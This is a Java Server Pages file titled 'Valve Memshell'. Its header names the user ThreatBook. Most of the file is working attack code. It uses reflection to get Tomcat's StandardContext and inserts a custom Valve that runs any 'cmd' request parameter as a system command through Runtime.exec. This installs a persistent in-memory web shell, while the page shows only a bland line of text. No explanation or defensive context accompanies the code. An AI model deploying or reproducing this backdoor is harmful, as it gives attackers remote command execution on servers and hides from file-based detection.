<%--
  Created by IntelliJ IDEA.
  User: ThreatBook
  Date: 2023/7/6
  Time: 0:03
  To change this template use File | Settings | File Templates.
--%>
<%@ page contentType="text/html;charset=UTF-8" language="java" %>

<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<%@ page import="org.apache.catalina.Pipeline" %>
<%@ page import="org.apache.catalina.valves.ValveBase" %>
<%@ page import="org.apache.catalina.connector.Response" %>
<%@ page import="java.io.IOException" %>


<%
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext standardContext = (StandardContext) req.getContext();

    Pipeline pipeline = standardContext.getPipeline();
%>

<%!
    class Shell_Valve extends ValveBase {

        @Override
        public void invoke(Request request, Response response) throws IOException, ServletException {
            String cmd = request.getParameter("cmd");
            if (cmd != null){
                try {
                    Runtime.getRuntime().exec(cmd);
                }catch (IOException | NullPointerException exception){
                    exception.printStackTrace();
                }
            }
            getNext().invoke(request, response);
        }
    }
%>

<%
    Shell_Valve shell_valve = new Shell_Valve();
    pipeline.addValve(shell_valve);
%>




<html>
<head>
    <title>Valve Memshell</title>
</head>
<body>
    <br>普通jsp直接页面返回！！<br>
</body>
</html>
